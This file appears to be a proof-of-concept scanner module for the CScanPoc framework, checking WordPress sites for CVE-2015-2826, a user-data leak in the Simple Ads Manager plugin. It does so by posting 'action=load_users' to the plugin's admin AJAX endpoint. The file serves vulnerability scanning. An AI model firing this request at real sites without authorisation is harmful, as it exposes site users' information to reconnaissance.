# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0047' # 平台漏洞编号，留空
    name = 'WordPress Simple Ads Manager 插件信息泄露' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
        WordPress Simple Ads Manager 插件信息泄露漏洞.
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36615/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'CVE-2015-2826' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Simple Ads Manager'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '36681cee-5b9f-46c4-a483-31746e673510'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php'
            url = arg + payload
            post_data = 'action=load_users'
            req = requests.post(url, data=post_data)
            if req.status_code == 200 and 'recid' in req.text :
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()